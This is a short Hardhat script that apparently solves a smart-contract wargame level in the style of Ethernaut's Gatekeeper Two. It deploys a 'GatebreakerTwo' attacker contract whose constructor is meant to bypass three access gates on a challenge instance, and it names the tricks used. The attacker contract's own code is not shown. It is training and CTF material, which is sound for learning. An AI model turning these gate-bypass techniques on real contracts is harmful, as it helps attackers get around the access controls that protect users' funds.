const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0x3060A813752f5B4Ae5d9f965b9F5625f530F31AC'
const abi = ["function entrant() external view returns (address)"]

async function hack(contract, signer) {
    // We need to deploy a contract and call enter() from there to meet the condition of Gate One.
    const GatebreakerTwo = await ethers.getContractFactory("GatebreakerTwo");

    // All the logic needs to be in the constructor to meet the condition of Gate Two.
    const gatebreakerTwo = await GatebreakerTwo.deploy(contract.address);

    // In the constructor, we use assembly to emulate the logic check for Gate Three.
    await gatebreakerTwo.deployed();

    const entrant = await contract.entrant();
    console.log("Entrant:", entrant);
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})